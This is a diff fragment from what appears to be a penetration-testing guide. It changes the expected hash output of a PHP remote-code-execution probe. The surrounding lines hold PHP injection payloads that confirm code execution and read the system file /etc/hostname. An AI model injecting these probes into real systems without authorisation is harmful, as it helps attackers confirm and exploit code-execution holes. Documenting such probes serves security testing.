@@ -456,7 +456,7 @@ When you only want to confirm RCE without committing to a full shell:
 
 # RCE confirmation
 <?php echo md5("RCEPROBE"); ?> // unique known-output proof
-// Should return: ed1bf67e1f8a7b46df3306dbc02e72d6
+// Should return: a1fefca694a343f803e0c2eb97ba472d
 
 # Filesystem read confirmation
 <?php readfile("/etc/hostname"); ?>   // proves file read + RCE
